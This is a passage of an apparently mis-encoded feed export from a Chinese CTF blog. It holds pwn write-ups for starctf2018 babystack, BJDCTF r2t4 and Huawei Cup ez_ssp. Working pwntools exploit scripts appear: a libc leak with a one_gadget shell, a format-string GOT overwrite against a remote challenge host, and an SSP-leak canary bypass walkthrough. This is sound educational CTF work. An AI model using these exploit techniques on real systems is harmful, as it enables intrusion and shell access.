punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"It's time to say goodbye.\n"</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget_libc <span class="token operator">=</span> <span class="token number">0x4f322</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>one_gadget_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> one_gadget_libc   <span class="token comment"># æ ¹æ® libc åç§»è®¡ç®— one_gadget çœŸå®åœ°å€</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bin_sh_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token comment"># payload = p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span>debug<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># ä¸è¿œç¨‹äº¤äº’</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h1><blockquote><p>flag{4f062841-5776-44e5-b0fc-adab7593184b}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack7.png" alt="ã€starctf2018ã€‘babystack7.png"></p>]]></content>
    
    
    <summary type="html">é€šè¿‡ä¿®æ”¹ TLS ç»“æ„ä½“ä¸­çš„ stack_guard å˜é‡æ¥æ§åˆ¶ Canaryï¼Œå‰ææ˜¯æº¢å‡ºç©ºé—´è¶³å¤Ÿé•¿å¹¶ä¸”å­˜åœ¨å­çº¿ç¨‹ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜æˆåŠŸæ„é€  system(&quot;/bin/sh&quot;) å´æ— æ³• getshellï¼Œå¿…é¡»ä½¿ç”¨ execve(&quot;/bin/sh&quot;, 0, 0)</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Bypass" scheme="https://www.uf4te.cn/tags/Bypass/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="æ ˆè¿ç§»" scheme="https://www.uf4te.cn/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    
    <category term="Writeup" scheme="https://www.uf4te.cn/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>ã€BJDCTF 2ndã€‘r2t4</title>
    <link href="https://www.uf4te.cn/posts/a0efa060.html"/>
    <id>https://www.uf4te.cn/posts/a0efa060.html</id>
    <published>2024-05-14T06:14:52.000Z</published>
    <updated>2024-06-05T06:36:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ”¶è·"><a href="#æ”¶è·" class="headerlink" title="æ”¶è·"></a>æ”¶è·</h1><ul><li>å­˜åœ¨ Canary ä¿æŠ¤ï¼Œåªèƒ½ä½¿ç”¨ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ²¡æœ‰å¼€ PIEï¼Œå› æ­¤æƒ³åˆ°åŠ«æŒ <code>__stack_chk_fail</code> çš„ GOT è¡¨åœ°å€ä¸ºåé—¨å‡½æ•°çš„åœ°å€</li></ul><hr><p><a href="https://buuoj.cn/challenges#[BJDCTF%202nd]r2t4">ã€BJDCTF 2ndã€‘r2t4</a></p><hr><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p>æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%201.png" alt="ã€BJDCTF 2ndã€‘r2t4 1.png"></p><p>å°è¯•è¿è¡Œï¼Œæ˜æ˜¾å­˜åœ¨æº¢å‡ºï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%202.png" alt="ã€BJDCTF 2ndã€‘r2t4 2.png"></p><p>IDA ä¸‹åˆ†æï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%203.png" alt="ã€BJDCTF 2ndã€‘r2t4 3.png"></p><p>æ˜æ˜¾ <code>buf</code> å¤„å­˜åœ¨æº¢å‡ºï¼Œä¸” <code>printf(buf)</code> å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p>å­˜åœ¨ä¸€ä¸ªåé—¨å‡½æ•° <code>backdoor()</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%204.png" alt="ã€BJDCTF 2ndã€‘r2t4 4.png"></p><p>ä½†è¿™é‡Œ <code>buf</code> æº¢å‡ºçš„é•¿åº¦æœ‰é™ï¼Œåªèƒ½åˆšå¥½è¦†ç›–è¿”å›åœ°å€</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%205.png" alt="ã€BJDCTF 2ndã€‘r2t4 5.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%206.png" alt="ã€BJDCTF 2ndã€‘r2t4 6.png"></p><p>è€ƒè™‘åˆ° <code>Partial RELRO</code>ï¼Œå¹¶ä¸”å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä¸”åªèƒ½ä½¿ç”¨ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p>å› æ­¤å°è¯•åŠ«æŒ <code>__stack_chk_fail</code> å‡½æ•°çš„ GOT è¡¨åœ°å€ä¸ºåé—¨å‡½æ•° <code>backdoor()</code> çš„åœ°å€</p><p>ç”±äºæ˜¯ 64 ä½ç¨‹åºï¼Œæ ¹æ®æ ˆçš„å¸ƒå±€å¯çŸ¥ï¼Œè¾“å…¥çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»ä¸º 6</p><blockquote><p>å¦‚æœå¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸ç†Ÿæ‚‰çš„è¯ï¼Œå¯ä»¥çœ‹çœ‹æœ¬ç«™ã€Š<a href="%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A8.md">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸åˆ©ç”¨</a>ã€‹ä¸€æ–‡</p></blockquote><hr><h1 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># è®¾ç½®ç³»ç»Ÿæ¶æ„, æ‰“å°è°ƒè¯•ä¿¡æ¯</span><span class="token comment"># arch å¯é€‰ : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN è¿œç¨‹ : content = 0, PWN æœ¬åœ° : content = 1</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./r2t4"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.29.so"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># å°†æœ¬åœ°çš„ Linux ç¨‹åºå¯åŠ¨ä¸ºè¿›ç¨‹ io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./r2t4"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment"># è¿œç¨‹ç¨‹åºçš„ IP å’Œç«¯å£å·</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">28170</span><span class="token punctuation">)</span><span class="token comment"># é™„åŠ  gdb è°ƒè¯•</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># åªæœ‰æœ¬åœ°æ‰å¯è°ƒè¯•ï¼Œè¿œç¨‹æ— æ³•è°ƒè¯•</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span>backdoor_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"backdoor"</span><span class="token punctuation">]</span>__stack_chk_fail_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__stack_chk_fail"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>__stack_chk_fail_got_addr<span class="token punctuation">:</span> backdoor_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># ä¸è¿œç¨‹äº¤äº’</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h1><blockquote><p>flag{90b19213-0fe1-4802-a73f-7e4f38962e88}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%207.png" alt="ã€BJDCTF 2ndã€‘r2t4 7.png"></p>]]></content>
    
    
    <summary type="html">ç¨‹åºå­˜åœ¨ Canary ä¿æŠ¤ï¼Œåªèƒ½ä½¿ç”¨ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ²¡æœ‰å¼€ PIEï¼Œæº¢å‡ºä¹Ÿåªèƒ½åˆšå¥½è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œå› æ­¤æƒ³ç»•è¿‡ Canary æ„é€  ROP å¾ˆå›°éš¾ï¼Œä½†å¯ä»¥åŠ«æŒ __stack_chk_fail çš„ GOT è¡¨åœ°å€ä¸ºåé—¨å‡½æ•°çš„åœ°å€</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Bypass" scheme="https://www.uf4te.cn/tags/Bypass/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="Writeup" scheme="https://www.uf4te.cn/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>ã€åä¸ºæ¯ 2023ã€‘ez_ssp</title>
    <link href="https://www.uf4te.cn/posts/12245599.html"/>
    <id>https://www.uf4te.cn/posts/12245599.html</id>
    <published>2024-05-13T02:13:27.000Z</published>
    <updated>2024-06-05T06:36:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ”¶è·"><a href="#æ”¶è·" class="headerlink" title="æ”¶è·"></a>æ”¶è·</h1><ul><li><p><mark>åˆ©ç”¨ glibc-all-in-one å’Œ patchelf ä¿®æ”¹äºŒè¿›åˆ¶æ–‡ä»¶çš„ libc ç‰ˆæœ¬</mark></p></li><li><p><mark>GDB è¿›è¡Œå¤šè¿›ç¨‹çš„è°ƒè¯•æ–¹æ³•</mark></p></li><li><p>åˆ©ç”¨ SSP Leak ç»•è¿‡ Canaryï¼Œä¿®æ”¹ <code>__fortify_fail</code> å‡½æ•°ä¸­è¦è¾“å‡ºçš„å˜é‡ <code>__libc_argv[0]</code> çš„åœ°å€ï¼Œæ•…æ„è§¦å‘ Canary ä¿æŠ¤å®ç°ä»»æ„åœ°å€è¯»</p></li><li><p><mark>libc ä¸­å­˜åœ¨ç€ä¸€ä¸ª <code>environ</code> å‡½æ•°ï¼Œå®ƒæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå‚¨å­˜ç€ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ï¼Œé€šè¿‡æ³„éœ² <code>environ</code> çš„çœŸå®åœ°å€å¤„çš„å€¼å¯ä»¥å¾—åˆ°æ ˆä¸Šå­˜å‚¨çš„ç¯å¢ƒå˜é‡çš„é¦–åœ°å€</mark></p></li></ul><hr><p>ä»Šå¤©æ•´ç†ç¬”è®°çš„æ—¶å€™æ‰¾ä¾‹é¢˜çªç„¶æƒ³èµ·äº†å»å¹´åä¸ºæ¯æœ‰ä¸€é“ç±»ä¼¼çš„é¢˜ï¼Œä¸è¿‡é“¾æ¥æ—©å°±ä¸è®°å¾—å•¦ï¼Œéœ€è¦åŸé¢˜äºŒè¿›åˆ¶æ–‡ä»¶çš„å»ç½‘ä¸Šæœæœçœ‹æœ‰æ²¡æœ‰å§ï¼Œæˆ–è€…é‚®ç®±æ‰¾æˆ‘è¦ä¹Ÿå¯ä»¥</p><hr><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><blockquote><p>ç”±äºæ˜¯æœ¬åœ°å¤ç°ï¼Œè¿™ä¸ª SSP Leak ä¾èµ–äº Glibc ç‰ˆæœ¬ï¼Œè¯¦æƒ…å¯æŸ¥çœ‹æœ¬ç«™ã€Š<a href="Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6.md">Bypasså®‰å…¨æœºåˆ¶</a>ã€‹ä¸€æ–‡çš„ <em>ã€ŠSSP Leak ç»•è¿‡ Canaryã€‹</em> éƒ¨åˆ†</p><p>å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å…ˆä½¿ç”¨ patchelf æ›´æ”¹é¢˜ç›®çš„äºŒè¿›åˆ¶ç¨‹åºä½¿ç”¨çš„ libc ç‰ˆæœ¬ï¼Œå…·ä½“æ“ä½œè¯¦æƒ…å¯æŸ¥çœ‹æœ¬ç«™ã€Š<a href="Pwntools%E4%B8%8Eexp%E6%8A%80%E5%B7%A7.md">Pwntoolsä¸expæŠ€å·§</a>ã€‹ä¸€æ–‡çš„ <em>ã€Šglibc-all-in-one å’Œ patchelfã€‹</em> éƒ¨åˆ†</p></blockquote><p>è¯¥é¢˜ç»™å‡ºäº† Glibc ç‰ˆæœ¬ä¸º 2.23</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp1.png" alt="åä¸ºæ¯2023-ez_ssp1.png"></p><p>ç”±äº SSP Leak åœ¨ Ubuntu 22.04 æœ¬åœ°æ˜¯æ— æ³•å¤ç°çš„ï¼Œå› ä¸º Glibc 2.35 ä¿®å¤äº†è¿™ä¸ªé—®é¢˜ï¼ˆä¸è¿‡ Ubuntu 16.04 çš„ Glibc 2.23 å¯ä»¥ï¼‰</p><p>é¦–å…ˆé€šè¿‡ glibc-all-in-one ä¸‹è½½ <code>2.23-0ubuntu11.3_amd64</code> ç‰ˆæœ¬çš„ libcï¼Œå¹¶é€šè¿‡ patchelf æ›¿æ¢ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp2.png" alt="åä¸ºæ¯2023-ez_ssp2.png"></p><p>å®‰å…¨æœºåˆ¶ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp4.png" alt="åä¸ºæ¯2023-ez_ssp4.png"></p><p>åœ¨ IDA ä¸‹åˆ†æï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp3.png" alt="åä¸ºæ¯2023-ez_ssp3.png"></p><p>ç¨‹åºä¼šå…ˆæ‰“å¼€æœ¬åœ°çš„ flag æ–‡ä»¶å¹¶è¯»å–å†…å®¹ï¼Œä¿å­˜åˆ° <code>s</code> ä¸­ï¼Œ<code>s</code> ä½äºæ ˆä¸Š</p><p><strong>ç”±äºæˆ‘ä»¬æœ¬åœ°æ²¡æœ‰ flag æ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±åˆ›å»ºä¸€ä¸ªï¼Œå¦åˆ™ç¨‹åºè¿è¡Œä¼šæŠ¥é”™ï¼Œæˆ‘ä»¬ä¹Ÿæ— æ³•è¿›è¡Œè°ƒè¯•</strong></p><p>flag å†…å®¹éšä¾¿å†™ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp5.png" alt="åä¸ºæ¯2023-ez_ssp5.png"></p><p>é¦–å…ˆæ ¹æ® <code>v3</code> ç”Ÿæˆéšæœºæ•° <code>v7</code>ï¼Œç„¶åå°†æˆ‘ä»¬è¾“å…¥çš„ <code>buf</code> ä¸ <code>v7</code> ä¸€èµ·ä½œä¸º <code>sub_400A65()</code> çš„å‚æ•°ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp6.png" alt="åä¸ºæ¯2023-ez_ssp6.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°ä¹Ÿæ˜¯ç”¨æ¥ç”Ÿæˆéšæœºæ•°çš„ï¼Œå°†éšæœºæ•°è¿”å›èµ‹å€¼ç»™ <code>v9</code></p><p>ç„¶åå°† flag å’Œ <code>v9</code> ä¸€èµ·æ‰§è¡Œ <code>sub_400AB0(s, v9, 50)</code>ï¼Œæ ¹æ®å‰é¢è¯»å– flag çš„é•¿åº¦ä¸º <code>0x32</code> å¯ä»¥å¾—çŸ¥ï¼Œè¿™é‡Œçš„ <code>50</code> æ˜¯è¯»å– flag çš„é•¿åº¦</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp7.png" alt="åä¸ºæ¯2023-ez_ssp7.png"></p><p>è¿™ä¸ªå‡½æ•°å°† flag çš„æ¯ä¸€ä½ä¸éšæœºæ•° <code>v9</code> è¿›è¡Œäº†å¼‚æˆ–ï¼Œå·®ä¸å¤šå¯ä»¥ç†è§£ä¸ºå¼‚æˆ–åŠ å¯†äº†ä¸€ä¸‹</p><p>ç„¶åæœ‰ä¸€ä¸ª for å¾ªç¯ï¼Œå¯ä»¥å¾ªç¯ 3 æ¬¡ï¼Œæ¯æ¬¡éƒ½ä¼šé€šè¿‡ <code>fork()</code> å‡½æ•°ç”Ÿæˆä¸€ä¸ªå­è¿›ç¨‹</p><blockquote><p>æ³¨æ„ï¼š<strong>å­è¿›ç¨‹å´©æºƒä¸ä¼šå¯¼è‡´çˆ¶è¿›ç¨‹é€€å‡º</strong></p><p>å› æ­¤æˆ‘ä»¬ç›¸å½“äºæœ‰ 3 æ¬¡è¦†ç›– Canary çš„æœºä¼šï¼Œä½†æ˜¯æƒ³ä¿®æ”¹è¿”å›åœ°å€ä¾ç„¶æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œå› ä¸ºå­è¿›ç¨‹ä¼šå´©æºƒ</p></blockquote><p>æ¯è½®å¾ªç¯æœ‰ä¸¤æ¬¡è¾“å…¥ï¼Œç¬¬ä¸€ä¸ª <code>buf</code> å¤„æ˜æ˜¾æ²¡æœ‰æº¢å‡ºï¼Œä½†ç¬¬äºŒä¸ª <code>gets(v12)</code> å­˜åœ¨æ˜æ˜¾æº¢å‡º</p><p>æ ˆä¸­çš„æƒ…å†µï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp8.png" alt="åä¸ºæ¯2023-ez_ssp8.png"></p><p>é™æ€ä¿¡æ¯è·å–å·®ä¸å¤šäº†ï¼Œæ¥ä¸‹æ¥å°±éœ€è¦è¿›è¡ŒåŠ¨æ€è°ƒè¯•äº†</p><blockquote><p>æ³¨æ„ï¼Œè¿™é‡Œæ¶‰åŠåˆ°å¤šè¿›ç¨‹ï¼Œéœ€è¦è¿›è¡Œå¤šè¿›ç¨‹çš„ GDB åŠ¨æ€è°ƒè¯•ï¼Œå¦‚æœä¸ç†Ÿæ‚‰çš„è¯ï¼Œå¯ä»¥çœ‹çœ‹æœ¬ç«™ã€Š<a href="GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A8.md">GDBçš„åŸºç¡€å’Œä½¿ç”¨</a>ã€‹ä¸€æ–‡ä¸­çš„ <em>ã€Šfork å¤šè¿›ç¨‹è°ƒè¯•ã€‹</em> éƒ¨åˆ†</p></blockquote><p>ä¸ºäº†ä¾¿äºæˆ‘ä»¬è°ƒè¯•ï¼Œæˆ‘ä»¬é¦–å…ˆå°† GDB è®¾ç½®å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> follow-fork-mode child   <span class="token comment"># fork ä¹‹åè°ƒè¯•å­è¿›ç¨‹ï¼Œçˆ¶è¿›ç¨‹ä¸å—å½±å“</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> detach-on-fork off   <span class="token comment"># åŒæ—¶è°ƒè¯•çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶ååœ¨ <code>gets()</code> çš„ <code>0x400CAC</code> å¤„ä¸‹æ–­ç‚¹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp9.png" alt="åä¸ºæ¯2023-ez_ssp9.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp10.png" alt="åä¸ºæ¯2023-ez_ssp10.png"></p><p>ç¬¬ä¸€ä¸ªè¾“å…¥ä¸å­˜åœ¨æº¢å‡ºï¼Œæˆ‘è¿™é‡Œè¾“å…¥ <code>uf4te</code></p><p>ç¬¬äºŒä¸ªè¾“å…¥éœ€è¦è®¡ç®—åç§»ï¼Œæˆ‘è¿™é‡Œè¾“å…¥ <code>aaaaaaaa</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp11.png" alt="åä¸ºæ¯2023-ez_ssp11.png"></p><p>æ ¹æ®è§¦å‘ Canary ä¼šè¾“å‡ºæ–‡ä»¶åï¼ŒRBP ä¸‹é¢é‚£ä¸€ä¸²æ–‡ä»¶è·¯å¾„å°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„ <code>__libc_argv[0]</code>ï¼Œä¹Ÿå¯ä»¥åœ¨ GDB ä¸­è¿›è¡ŒéªŒè¯ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp12.png" alt="åä¸ºæ¯2023-ez_ssp12.png"></p><p>è®¡ç®—åç§»å¾—åˆ°ç¬¬äºŒæ¬¡è¾“å…¥ä¸ <code>__libc_argv[0]</code> ä¹‹é—´çš„è·ç¦»ï¼Œéœ€è¦å¡«å…… <code>0x128</code> ä¸ªåƒåœ¾å­—ç¬¦è¿›è¡Œè¦†ç›–</p><p>è™½ç„¶ç¨‹åºæ²¡æœ‰å¼€ PIEï¼Œä½†æ˜¯æ ˆåœ°å€æ˜¯éšæœºçš„ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦ç”¨åˆ° libc ä¸­çš„ <code>environ</code> å‡½æ•°å¸®åŠ©æˆ‘ä»¬è®¡ç®—æ ˆåç§»</p><blockquote><p>å…³äº <code>environ</code> å‡½æ•°çš„è¯¦ç»†ä»‹ç»è§æœ¬ç«™çš„ã€Š<a href="Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6.md">Bypasså®‰å…¨æœºåˆ¶</a>ã€‹ä¸€æ–‡ä¸­ <em>ã€ŠSSP Leak ç»•è¿‡ Canaryã€‹</em> éƒ¨åˆ†</p></blockquote><p>å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦é¦–å…ˆè·å– <code>environ</code> å‡½æ•°çš„çœŸå®åœ°å€ï¼Œè¿™é‡Œé€‰æ‹©å…ˆæ³„éœ²ä¸€ä¸ª <code>read()</code> å‡½æ•°çš„çœŸå®åœ°å€ï¼Œç„¶åè¿›è¡Œ libc åŸºåœ°å€çš„è®¡ç®—å³å¯</p><p>å°† <code>__libc_argv[0]</code> è¦†ç›–ä¸º <code>read_got_addr</code>ï¼Œç„¶åç”±äºè§¦å‘ Canary ä¼šå°† <code>read()</code> å‡½æ•°çš„çœŸå®åœ°å€æ³„éœ²å‡ºæ¥</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp13.png" alt="åä¸ºæ¯2023-ez_ssp13.png"></p><p>è®¡ç®—å¾—åˆ° <code>environ</code> å‡½æ•°çš„çœŸå®åœ°å€åï¼Œå†å°† <code>__libc_argv[0]</code> è¦†ç›–ä¸º <code>environ</code> å‡½æ•°çš„çœŸå®åœ°å€ï¼Œæ³„éœ²å‡ºæ ˆä¸Šç¯å¢ƒå˜é‡çš„é¦–åœ°å€</p><p><img 